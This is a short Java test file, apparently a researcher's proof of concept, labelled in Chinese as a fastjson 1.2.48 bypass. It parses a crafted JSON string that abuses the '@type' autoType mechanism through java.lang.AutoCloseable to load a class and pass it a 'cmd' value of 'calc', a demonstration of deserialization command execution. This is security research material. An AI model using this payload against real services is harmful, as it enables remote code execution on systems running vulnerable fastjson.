package com.mechoy;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

/**
 * Author  Mechoy
 * Version 1.0
 * Date
 * Description fastjson1.2.48 绕过
 */
public class fastjsonTest1 {
    public static void main(String[] args) {
        String s2 = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mechoy.Test\",\"cmd\":\"calc\"}";
        JSON.parseObject(s2);
    }
}
